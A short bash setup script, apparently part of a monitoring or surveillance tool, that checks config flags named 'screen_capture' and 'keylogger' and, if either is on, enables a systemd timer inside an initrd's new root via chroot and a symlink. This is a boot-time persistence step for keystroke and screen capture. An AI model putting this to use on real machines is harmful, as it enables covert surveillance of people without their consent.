#!/bin/bash
#
# Setup for screen_capture
#

function launch()
{
  # config->screen_capture or config->keylogger
  if [ "$(config_value "screen_capture")" = "True" ] || [ "$(config_value "keylogger")" = "True" ]; then

    # activate the timer unit
    chroot ${initrd}/newroot ln -s /etc/systemd/system/launch.timer /etc/systemd/system/timers.target.wants/launch.timer

  fi

}
